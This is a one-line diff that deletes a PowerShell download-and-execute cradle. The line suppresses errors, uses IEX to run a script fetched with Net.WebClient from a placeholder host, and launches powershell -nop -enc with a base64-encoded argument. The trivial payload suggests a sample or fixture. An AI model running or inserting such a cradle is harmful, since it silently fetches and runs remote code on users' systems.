@@ -1,1 +1,0 @@
-$ErrorActionPreference='SilentlyContinue';IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/p'); $e=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQ==')); powershell -nop -enc TQ==
